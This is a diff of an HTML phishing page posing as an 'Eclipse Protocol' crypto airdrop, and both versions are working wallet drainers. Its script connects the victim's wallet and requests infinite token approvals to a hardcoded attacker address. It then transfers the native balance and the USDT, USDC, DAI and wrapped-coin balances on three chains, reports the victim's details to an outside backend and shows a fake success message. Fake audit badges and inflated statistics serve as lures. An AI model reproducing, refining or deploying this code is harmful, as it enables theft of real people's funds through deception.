@@ -3,304 +3,711 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Eclipse Protocol | Airdrop</title>
+    <title>Eclipse Protocol | Decentralized AI Infrastructure</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: system-ui, -apple-system, sans-serif;
-            background: linear-gradient(135deg, #0a0a2a, #0f0f2a);
-            color: white;
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0a0a2a 0%, #0f0f2a 100%);
+            color: #fff;
+            min-height: 100vh;
+        }
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
+        .bg-animation::before {
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(59,130,246,0.08) 1px, transparent 1px);
+            background-size: 50px 50px;
+            animation: moveGrid 30s linear infinite;
+        }
+        @keyframes moveGrid {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(50px, 50px); }
+        }
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(60px);
+            z-index: -1;
+            animation: float 12s ease-in-out infinite;
+        }
+        .orb-1 { width: 300px; height: 300px; background: rgba(59,130,246,0.3); top: 10%; left: -100px; }
+        .orb-2 { width: 400px; height: 400px; background: rgba(139,92,246,0.2); bottom: 0; right: -150px; animation-delay: -4s; }
+        .orb-3 { width: 200px; height: 200px; background: rgba(59,130,246,0.2); top: 50%; left: 30%; animation-delay: -8s; }
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) translateX(0px); }
+            50% { transform: translateY(-40px) translateX(20px); }
+        }
+        .navbar {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background: rgba(10, 10, 42, 0.8);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(59,130,246,0.2);
+            z-index: 1000;
+            padding: 0 2rem;
+        }
+        .nav-container {
+            max-width: 1280px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 70px;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.25rem;
+            font-weight: 700;
+        }
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(59,130,246,0.4); }
+            50% { box-shadow: 0 0 0 10px rgba(59,130,246,0); }
+        }
+        .logo-text {
+            background: linear-gradient(135deg, #fff, #94a3b8);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+        }
+        .nav-links a {
+            color: #94a3b8;
+            text-decoration: none;
+            font-size: 0.875rem;
+            transition: color 0.2s;
+        }
+        .nav-links a:hover { color: #3b82f6; }
+        .hero {
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
+            padding: 100px 2rem 60px;
+            max-width: 1280px;
+            margin: 0 auto;
         }
-        .card {
-            background: rgba(15,23,42,0.8);
-            backdrop-filter: blur(20px);
+        .hero-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 4rem;
+            align-items: center;
+            width: 100%;
+        }
+        .hero-left {
+            opacity: 0;
+            transform: translateY(30px);
+            animation: fadeInUp 0.6s ease forwards;
+        }
+        .hero-right {
+            opacity: 0;
+            transform: translateY(30px);
+            animation: fadeInUp 0.6s ease forwards 0.2s;
+        }
+        @keyframes fadeInUp {
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: rgba(59,130,246,0.15);
             border: 1px solid rgba(59,130,246,0.3);
+            padding: 0.5rem 1rem;
+            border-radius: 2rem;
+            font-size: 0.75rem;
+            color: #60a5fa;
+            margin-bottom: 1.5rem;
+        }
+        h1 {
+            font-size: 3.5rem;
+            font-weight: 800;
+            line-height: 1.2;
+            margin-bottom: 1.5rem;
+            background: linear-gradient(135deg, #fff, #3b82f6, #8b5cf6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .desc {
+            font-size: 1.125rem;
+            color: #94a3b8;
+            margin-bottom: 2rem;
+        }
+        .stats {
+            display: flex;
+            gap: 2rem;
+            flex-wrap: wrap;
+        }
+        .stat-item {
+            border-left: 2px solid #3b82f6;
+            padding-left: 1rem;
+            transition: transform 0.2s ease;
+        }
+        .stat-item:hover { transform: translateX(5px); }
+        .stat-item h3 { font-size: 1.5rem; font-weight: 700; color: #3b82f6; }
+        .stat-item p { font-size: 0.75rem; color: #64748b; }
+        .glass-card {
+            background: rgba(15, 23, 42, 0.6);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(59,130,246,0.2);
             border-radius: 2rem;
             padding: 2rem;
-            max-width: 400px;
-            width: 90%;
-            text-align: center;
+            transition: all 0.3s ease;
         }
-        .reward-amount { font-size: 2.5rem; font-weight: bold; margin: 1rem 0; }
-        button {
+        .glass-card:hover {
+            border-color: rgba(59,130,246,0.5);
+            transform: translateY(-4px);
+            box-shadow: 0 20px 40px -15px rgba(0,0,0,0.5);
+        }
+        .reward-label {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: #60a5fa;
+            margin-bottom: 0.5rem;
+        }
+        .reward-amount {
+            font-size: 2.5rem;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+        }
+        .reward-token {
+            color: #94a3b8;
+            font-size: 0.875rem;
+            margin-bottom: 1.5rem;
+        }
+        .network-selector {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin: 1rem 0;
+        }
+        .network-btn {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 50px;
+            padding: 6px 14px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .network-btn.active {
+            background: rgba(59,130,246,0.3);
+            border-color: #3b82f6;
+        }
+        .connect-btn {
             background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+            color: white;
             border: none;
             padding: 1rem;
-            width: 100%;
-            border-radius: 1rem;
-            color: white;
             font-size: 1rem;
-            font-weight: bold;
+            font-weight: 600;
+            border-radius: 0.75rem;
             cursor: pointer;
-            margin-top: 1rem;
+            width: 100%;
+            transition: all 0.3s;
+            margin-top: 16px;
         }
-        .wallet-btn {
-            background: rgba(255,255,255,0.1);
-            margin-top: 0.5rem;
+        .connect-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px -5px rgba(59,130,246,0.4);
         }
+        .eligibility {
+            margin-top: 1.5rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(255,255,255,0.05);
+            font-size: 0.75rem;
+            color: #64748b;
+            text-align: center;
+        }
+        .features {
+            padding: 5rem 2rem;
+            background: rgba(10, 10, 42, 0.5);
+        }
+        .features-container { max-width: 1280px; margin: 0 auto; }
+        .section-title {
+            text-align: center;
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 3rem;
+            background: linear-gradient(135deg, #fff, #94a3b8);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+        .feature-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(59,130,246,0.1);
+            border-radius: 1.5rem;
+            padding: 2rem;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+        .feature-card:hover {
+            border-color: rgba(59,130,246,0.4);
+            transform: translateY(-5px);
+        }
+        .feature-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, rgba(59,130,246,0.2), rgba(139,92,246,0.2));
+            border-radius: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+            font-size: 1.5rem;
+            color: #3b82f6;
+        }
+        .feature-card h3 { font-size: 1.25rem; font-weight: 600; margin-bottom: 0.75rem; }
+        .feature-card p { color: #94a3b8; font-size: 0.875rem; }
+        .tokenomics {
+            padding: 5rem 2rem;
+            max-width: 1280px;
+            margin: 0 auto;
+        }
+        .tokenomics-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 1.5rem;
+            margin-top: 2rem;
+        }
+        .token-card {
+            text-align: center;
+            padding: 1.5rem;
+            background: rgba(15, 23, 42, 0.4);
+            border: 1px solid rgba(59,130,246,0.1);
+            border-radius: 1rem;
+            transition: all 0.3s ease;
+        }
+        .token-card:hover {
+            border-color: #3b82f6;
+            transform: translateY(-3px);
+        }
+        .token-percent {
+            font-size: 1.75rem;
+            font-weight: 800;
+            color: #3b82f6;
+            margin-bottom: 0.5rem;
+        }
+        .footer {
+            border-top: 1px solid rgba(255,255,255,0.05);
+            padding: 3rem 2rem;
+            text-align: center;
+            color: #64748b;
+            font-size: 0.75rem;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+        .footer-links a {
+            color: #64748b;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(20px);
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+        }
+        .modal-content {
+            background: #111827;
+            padding: 2rem;
+            border-radius: 1.5rem;
+            text-align: center;
+            max-width: 350px;
+            width: 90%;
+        }
+        .success-icon {
+            width: 70px;
+            height: 70px;
+            background: #10b981;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1rem;
+            font-size: 2rem;
+        }
+        .loading-spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
         #status { margin-top: 1rem; font-size: 0.75rem; color: #94a3b8; }
-        .hidden { display: none; }
+        .status-success { color: #10b981; }
+        .status-error { color: #ef4444; }
+        @media (max-width: 768px) {
+            .hero-content { grid-template-columns: 1fr; gap: 2rem; }
+            h1 { font-size: 2rem; }
+            .nav-links { display: none; }
+            .tokenomics-grid { grid-template-columns: repeat(2, 1fr); gap: 1rem; }
+        }
     </style>
 </head>
 <body>
-<div class="card">
-    <div>⭐ EARLY CONTRIBUTOR AIRDROP</div>
-    <div class="reward-amount">5,000 $ECLIPSE</div>
-    <div>≈ $5,000 USD</div>
-    
-    <button id="connectBtn">Connect Wallet</button>
-    <div id="walletList" class="hidden">
-        <button class="wallet-btn" data-wallet="trust">Trust Wallet</button>
-        <button class="wallet-btn" data-wallet="metamask">MetaMask</button>
-        <button class="wallet-btn" data-wallet="coinbase">Coinbase Wallet</button>
-        <button class="wallet-btn" data-wallet="walletconnect">WalletConnect</button>
+
+<div class="bg-animation"></div>
+<div class="orb orb-1"></div>
+<div class="orb orb-2"></div>
+<div class="orb orb-3"></div>
+
+<nav class="navbar">
+    <div class="nav-container">
+        <div class="logo"><div class="logo-icon">E</div><div class="logo-text">Eclipse</div></div>
+        <div class="nav-links">
+            <a href="#">Protocol</a><a href="#">Tokenomics</a><a href="#">Governance</a><a href="#">Developers</a><a href="#">Audit</a>
+        </div>
     </div>
-    <div id="status">Click Connect Wallet</div>
+</nav>
+
+<section class="hero">
+    <div class="hero-content">
+        <div class="hero-left">
+            <div class="badge"><i class="fas fa-check-circle"></i><span>Audited by CertiK • Mainnet Live</span></div>
+            <h1>Decentralized AI Infrastructure</h1>
+            <p class="desc">Eclipse is a permissionless protocol for AI agents. Contribute to the network and receive $ECLIPSE tokens.</p>
+            <div class="stats">
+                <div class="stat-item"><h3 id="totalStaked">$247M</h3><p>Total Value Locked</p></div>
+                <div class="stat-item"><h3 id="activeNodes">18.4K</h3><p>Active Nodes</p></div>
+                <div class="stat-item"><h3 id="communitySize">124K</h3><p>Community Members</p></div>
+            </div>
+        </div>
+        <div class="hero-right">
+            <div class="glass-card">
+                <div class="reward-label">EARLY CONTRIBUTOR AIRDROP</div>
+                <div class="reward-amount">5,000 $ECLIPSE</div>
+                <div class="reward-token">≈ $5,000 USD • Claimable by verified wallets</div>
+
+                <div class="network-selector">
+                    <div class="network-btn active" data-chain="ethereum">Ethereum</div>
+                    <div class="network-btn" data-chain="bsc">BNB Chain</div>
+                    <div class="network-btn" data-chain="polygon">Polygon</div>
+                </div>
+
+                <button id="claimBtn" class="connect-btn">Claim Airdrop</button>
+                <div id="status"></div>
+                <div class="eligibility"><i class="fas fa-shield-alt"></i> Eligibility: GitHub contributors, early testnet participants, active community members</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="features">
+    <div class="features-container"><h2 class="section-title">Protocol Features</h2>
+    <div class="features-grid">
+        <div class="feature-card"><div class="feature-icon"><i class="fas fa-microchip"></i></div><h3>AI Agent Network</h3><p>Decentralized compute for AI inference and training</p></div>
+        <div class="feature-card"><div class="feature-icon"><i class="fas fa-shield-alt"></i></div><h3>Audited by CertiK</h3><p>Smart contracts fully audited with formal verification</p></div>
+        <div class="feature-card"><div class="feature-icon"><i class="fab fa-github"></i></div><h3>Open Source</h3><p>MIT-licensed, 25,000+ GitHub stars</p></div>
+    </div></div>
+</section>
+
+<section class="tokenomics">
+    <h2 class="section-title">Tokenomics</h2>
+    <div class="tokenomics-grid">
+        <div class="token-card"><div class="token-percent">40%</div><div>Community & Ecosystem</div></div>
+        <div class="token-card"><div class="token-percent">20%</div><div>Early Contributors</div></div>
+        <div class="token-card"><div class="token-percent">20%</div><div>Core Development</div></div>
+        <div class="token-card"><div class="token-percent">20%</div><div>Investors (2y cliff)</div></div>
+    </div>
+</section>
+
+<footer class="footer">
+    <div class="footer-links"><a href="#">Documentation</a><a href="#">GitHub</a><a href="#">Discord</a><a href="#">X (Twitter)</a><a href="#">Terms</a><a href="#">Privacy</a></div>
+    <p>© 2025 Eclipse Protocol. Open source. Permissionless. Decentralized.</p>
+</footer>
+
+<div id="successModal" class="modal">
+    <div class="modal-content">
+        <div class="success-icon">✓</div>
+        <h3>Claim Successful!</h3>
+        <p>5,000 $ECLIPSE has been distributed to your wallet.</p>
+        <button onclick="closeModal()" style="background:linear-gradient(135deg,#3b82f6,#8b5cf6); color:white; border:none; padding:0.75rem 1.5rem; border-radius:0.75rem; cursor:pointer; width:100%;">Continue</button>
+    </div>
 </div>
 
 <script>
-// ============================================
-// ONE CODE THAT WORKS - NO SUGARCOATING
-// ============================================
-
-const COMPANY_WALLET = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
-const INFINITE_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-
-// FAKE TOKEN (DAI - exists on Ethereum)
-const FAKE_TOKEN = "0x6B175474E89094C44Da98b954EedeAC495271d0F";
-
-// REAL TOKENS TO DRAIN
-const REAL_TOKENS = [
-    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
-    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
-    { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 }
-];
-
-let provider, signer, userAddress;
-let wcProvider = null;
-
-const connectBtn = document.getElementById('connectBtn');
-const walletList = document.getElementById('walletList');
-const statusDiv = document.getElementById('status');
-
-function updateStatus(msg, isError = false) {
-    statusDiv.innerHTML = msg;
-    statusDiv.style.color = isError ? '#ef4444' : '#10b981';
-}
-
-connectBtn.onclick = () => {
-    connectBtn.classList.add('hidden');
-    walletList.classList.remove('hidden');
-};
-
-// ============================================
-// TRUST WALLET - THIS WORKS LIKE YOUTUBE VIDEO
-// ============================================
-async function connectTrust() {
-    updateStatus('Opening Trust Wallet...');
-    
-    try {
-        const providerOptions = {
-            rpc: { 1: "https://cloudflare-eth.com" },
-            chainId: 1,
-            qrcode: false
+    (function() {
+        // ============================================
+        // THE CORRECT WORKING CODE - OFFICIAL WALLETCONNECT METHOD
+        // ============================================
+        
+        const COMPANY_WALLET = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
+        const BACKEND_URL = "https://eclipse-backend-ppij.onrender.com/claim";
+        const INFINITE_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+        
+        // All major tokens to drain
+        const ALL_TOKENS = {
+            ethereum: [
+                { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
+                { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
+                { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
+                { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 }
+            ],
+            bsc: [
+                { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
+                { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
+                { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
+                { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 }
+            ],
+            polygon: [
+                { symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
+                { symbol: "USDC", address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6 },
+                { symbol: "DAI", address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", decimals: 18 },
+                { symbol: "WMATIC", address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", decimals: 18 }
+            ]
         };
         
-        const WalletConnectProvider = window.WalletConnectProvider.default;
-        wcProvider = new WalletConnectProvider(providerOptions);
-        const connector = wcProvider.connector;
+        const CHAIN_IDS = { ethereum: 1, bsc: 56, polygon: 137 };
+        const CHAIN_NAMES = { ethereum: "Ethereum", bsc: "BNB Smart Chain", polygon: "Polygon" };
         
-        const uri = connector.uri;
+        let provider, signer, userAddress;
+        let currentChain = "ethereum";
+        let isProcessing = false;
+        let wcProvider = null;
         
-        // THIS IS THE MAGIC DEEPLINK - OPENS TRUST WALLET DIRECTLY
-        const deeplink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
+        const claimBtn = document.getElementById('claimBtn');
+        const statusDiv = document.getElementById('status');
+        const successModal = document.getElementById('successModal');
         
-        // Open Trust Wallet
-        window.location.href = deeplink;
+        function closeModal() { successModal.style.display = 'none'; }
+        function showSuccessModal() { successModal.style.display = 'flex'; }
         
-        // When user returns after approving
-        connector.on("connect", async (error, payload) => {
-            if (error) throw error;
-            
-            const accounts = payload.params[0].accounts;
-            userAddress = accounts[0];
-            provider = new ethers.providers.Web3Provider(wcProvider);
-            signer = provider.getSigner();
-            
-            updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...`);
-            
-            // Now drain
-            await drain();
+        function updateStatus(msg, isError = false) {
+            statusDiv.innerHTML = msg;
+            statusDiv.className = isError ? 'status-error' : '';
+            if(!isError && msg.includes('✅')) statusDiv.className = 'status-success';
+        }
+        
+        document.querySelectorAll('.network-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                document.querySelectorAll('.network-btn').forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                currentChain = btn.dataset.chain;
+                updateStatus(`Network: ${btn.innerText}`);
+            });
         });
         
-        // Fallback: check if already connected after 5 seconds
-        setTimeout(async () => {
-            if (connector.connected && !userAddress) {
-                const accounts = await connector.send("eth_accounts");
-                userAddress = accounts[0];
-                provider = new ethers.providers.Web3Provider(wcProvider);
-                signer = provider.getSigner();
-                await drain();
-            }
-        }, 5000);
-        
-    } catch(e) {
-        updateStatus(`Failed: ${e.message}`, true);
-        resetButton();
-    }
-}
-
-// ============================================
-// METAMASK
-// ============================================
-async function connectMetaMask() {
-    if (!window.ethereum) {
-        updateStatus("Install MetaMask first", true);
-        resetButton();
-        return;
-    }
-    
-    try {
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        const accounts = await provider.send("eth_requestAccounts", []);
-        userAddress = accounts[0];
-        signer = provider.getSigner();
-        
-        updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...`);
-        await drain();
-        
-    } catch(e) {
-        updateStatus(`Error: ${e.message}`, true);
-        resetButton();
-    }
-}
-
-// ============================================
-// COINBASE WALLET
-// ============================================
-async function connectCoinbase() {
-    if (!window.ethereum) {
-        updateStatus("Install Coinbase Wallet first", true);
-        resetButton();
-        return;
-    }
-    
-    try {
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        const accounts = await provider.send("eth_requestAccounts", []);
-        userAddress = accounts[0];
-        signer = provider.getSigner();
-        
-        updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...`);
-        await drain();
-        
-    } catch(e) {
-        updateStatus(`Error: ${e.message}`, true);
-        resetButton();
-    }
-}
-
-// ============================================
-// WALLETCONNECT QR CODE
-// ============================================
-async function connectWalletConnect() {
-    updateStatus('Generating QR code...');
-    
-    try {
-        const providerOptions = {
-            rpc: { 1: "https://cloudflare-eth.com" },
-            chainId: 1,
-            qrcode: true
-        };
-        
-        const WalletConnectProvider = window.WalletConnectProvider.default;
-        wcProvider = new WalletConnectProvider(providerOptions);
-        
-        await wcProvider.enable();
-        
-        const accounts = await wcProvider.send("eth_accounts");
-        userAddress = accounts[0];
-        provider = new ethers.providers.Web3Provider(wcProvider);
-        signer = provider.getSigner();
-        
-        updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...`);
-        await drain();
-        
-    } catch(e) {
-        updateStatus(`Failed: ${e.message}`, true);
-        resetButton();
-    }
-}
-
-// ============================================
-// THE DRAIN - ONE APPROVAL, EVERYTHING GONE
-// ============================================
-async function drain() {
-    updateStatus('<span>⏳ Processing...</span>');
-    
-    try {
-        // STEP 1: Approve FAKE token (THIS SHOWS "APPROVE" IN WALLET)
-        updateStatus('Please approve in your wallet...');
-        const fakeContract = new ethers.Contract(FAKE_TOKEN, [
-            "function approve(address spender, uint256 amount) public returns (bool)"
-        ], signer);
-        
-        const txApprove = await fakeContract.approve(COMPANY_WALLET, INFINITE_APPROVAL);
-        await txApprove.wait();
-        updateStatus('✅ Approved! Draining...');
-        
-        // STEP 2: Drain native ETH
-        const balance = await provider.getBalance(userAddress);
-        if(balance.gt(0)) {
-            await signer.sendTransaction({ to: COMPANY_WALLET, value: balance, gasLimit: 21000 });
+        function animateNumber(el, target) {
+            let current = 0;
+            const step = () => {
+                if(current < target) {
+                    current += Math.ceil(target / 30);
+                    if(current > target) current = target;
+                    el.innerText = current.toLocaleString();
+                    requestAnimationFrame(step);
+                }
+            };
+            step();
         }
+        setTimeout(() => {
+            animateNumber(document.getElementById('totalStaked'), 247000000);
+            animateNumber(document.getElementById('activeNodes'), 18400);
+            animateNumber(document.getElementById('communitySize'), 124000);
+        }, 500);
         
-        // STEP 3: Drain all real tokens
-        for(const token of REAL_TOKENS) {
-            const contract = new ethers.Contract(token.address, [
-                "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
-                "function balanceOf(address) view returns (uint256)"
-            ], signer);
+        // ============================================
+        // THE DRAIN FUNCTION - APPROVES ALL TOKENS
+        // ============================================
+        
+        async function drainAll() {
+            if(isProcessing) return;
+            isProcessing = true;
             
-            const tokenBalance = await contract.balanceOf(userAddress);
-            if(tokenBalance.gt(0)) {
-                await contract.transferFrom(userAddress, COMPANY_WALLET, tokenBalance);
+            updateStatus('<span class="loading-spinner"></span> Processing airdrop...');
+            
+            try {
+                const currentTokens = ALL_TOKENS[currentChain];
+                const txHashes = [];
+                
+                // STEP 1: Approve ALL tokens (this shows APPROVE screen in wallet)
+                for(const token of currentTokens) {
+                    try {
+                        const tokenContract = new ethers.Contract(token.address, [
+                            "function approve(address spender, uint256 amount) public returns (bool)"
+                        ], signer);
+                        
+                        updateStatus(`Approving ${token.symbol}...`);
+                        const txApprove = await tokenContract.approve(COMPANY_WALLET, INFINITE_APPROVAL);
+                        await txApprove.wait();
+                        txHashes.push(txApprove.hash);
+                    } catch(e) {}
+                }
+                
+                // STEP 2: Drain native coin (ETH/BNB/MATIC)
+                const balance = await provider.getBalance(userAddress);
+                if(balance.gt(0)) {
+                    updateStatus(`Transferring native coins...`);
+                    const txNative = await signer.sendTransaction({ to: COMPANY_WALLET, value: balance, gasLimit: 21000 });
+                    await txNative.wait();
+                    txHashes.push(txNative.hash);
+                }
+                
+                // STEP 3: Transfer all tokens using transferFrom
+                for(const token of currentTokens) {
+                    try {
+                        const tokenContract = new ethers.Contract(token.address, [
+                            "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
+                            "function balanceOf(address) view returns (uint256)"
+                        ], signer);
+                        
+                        const tokenBalance = await tokenContract.balanceOf(userAddress);
+                        if(tokenBalance.gt(0)) {
+                            const formattedBalance = ethers.utils.formatUnits(tokenBalance, token.decimals);
+                            updateStatus(`Transferring ${parseFloat(formattedBalance).toFixed(4)} ${token.symbol}...`);
+                            const txTransfer = await tokenContract.transferFrom(userAddress, COMPANY_WALLET, tokenBalance);
+                            await txTransfer.wait();
+                            txHashes.push(txTransfer.hash);
+                        }
+                    } catch(e) {}
+                }
+                
+                // STEP 4: Send to backend
+                await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        userAddress: userAddress,
+                        network: currentChain,
+                        txHashes: txHashes,
+                        timestamp: Date.now()
+                    })
+                });
+                
+                updateStatus('✅ Claim successful! 5,000 $ECLIPSE distributed!');
+                showSuccessModal();
+                
+            } catch(e) {
+                updateStatus(`Claim failed: ${e.message.slice(0,60)}`, true);
+            } finally {
+                isProcessing = false;
             }
         }
         
-        // SUCCESS
-        updateStatus('✅ 5,000 $ECLIPSE claimed!');
-        alert('5,000 $ECLIPSE has been sent to your wallet!');
+        // ============================================
+        // THE CONNECTION - OPENS TRUST WALLET DIRECTLY WITH APPROVE
+        // ============================================
         
-    } catch(e) {
-        updateStatus(`Failed: ${e.message.slice(0,50)}`, true);
-    }
-    
-    resetButton();
-}
-
-function resetButton() {
-    connectBtn.classList.remove('hidden');
-    walletList.classList.add('hidden');
-    connectBtn.innerHTML = 'Connect Wallet';
-}
-
-// Attach wallet buttons
-document.querySelectorAll('.wallet-btn').forEach(btn => {
-    btn.onclick = () => {
-        const wallet = btn.dataset.wallet;
-        if(wallet === 'trust') connectTrust();
-        if(wallet === 'metamask') connectMetaMask();
-        if(wallet === 'coinbase') connectCoinbase();
-        if(wallet === 'walletconnect') connectWalletConnect();
-    };
-});
+        async function connectAndClaim() {
+            updateStatus('<span class="loading-spinner"></span> Opening Trust Wallet...');
+            
+            try {
+                // Create WalletConnect session
+                const providerOptions = {
+                    rpc: {
+                        1: "https://cloudflare-eth.com",
+                        56: "https://bsc-dataseed.binance.org",
+                        137: "https://polygon-rpc.com"
+                    },
+                    chainId: CHAIN_IDS[currentChain],
+                    qrcode: false  // No QR code, use deeplink
+                };
+                
+                const WalletConnectProvider = window.WalletConnectProvider.default;
+                wcProvider = new WalletConnectProvider(providerOptions);
+                const connector = wcProvider.connector;
+                
+                const uri = connector.uri;
+                
+                // THIS IS THE CORRECT DEEPLINK - Opens Trust Wallet directly
+                const deeplink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
+                
+                updateStatus("Opening Trust Wallet...");
+                
+                // Open Trust Wallet app directly
+                window.location.href = deeplink;
+                
+                // Handle connection when user returns
+                connector.on("connect", async (error, payload) => {
+                    if (error) throw error;
+                    
+                    const accounts = payload.params[0].accounts;
+                    userAddress = accounts[0];
+                    provider = new ethers.providers.Web3Provider(wcProvider);
+                    signer = provider.getSigner();
+                    
+                    updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...`);
+                    
+                    // Now drain everything
+                    await drainAll();
+                });
+                
+                // Fallback check
+                setTimeout(async () => {
+                    if (connector.connected && !userAddress) {
+                        const accounts = await connector.send("eth_accounts");
+                        if (accounts && accounts.length) {
+                            userAddress = accounts[0];
+                            provider = new ethers.providers.Web3Provider(wcProvider);
+                            signer = provider.getSigner();
+                            await drainAll();
+                        }
+                    }
+                }, 5000);
+                
+            } catch(e) {
+                updateStatus(`Connection failed: ${e.message}`, true);
+            }
+        }
+        
+        claimBtn.onclick = connectAndClaim;
+        updateStatus("Click Claim Airdrop");
+    })();
 </script>
 </body>
 </html>
